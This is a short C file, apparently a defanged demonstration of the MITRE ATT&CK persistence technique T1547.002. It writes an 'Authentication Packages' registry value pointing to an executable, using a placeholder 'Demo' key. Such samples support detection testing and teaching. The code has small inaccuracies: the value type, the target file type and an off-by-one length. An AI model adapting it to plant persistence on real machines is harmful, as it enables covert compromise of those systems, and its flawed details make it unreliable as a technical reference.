// Link      = https://attack.mitre.org/techniques/T1547/002/
// Technique = Boot or Logon Autostart Execution: Authentication Package
// ID        = T1547.002
// Tactics   = Persistence

#include <windows.h>

#define KEY_PATH "SYSTEM\\Demo"

#define TO_RUN "c:\\data\\my_runner.exe"

int main() {
    HKEY hKey;

    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, KEY_PATH,0,KEY_SET_VALUE,&hKey) != ERROR_SUCCESS) {
        return 1;
    }
    RegSetValueExA(hKey,"Authentication Packages",0,REG_SZ,(const BYTE*)TO_RUN,sizeof(TO_RUN)+1);
    RegCloseKey(hKey);

    return 0;
}
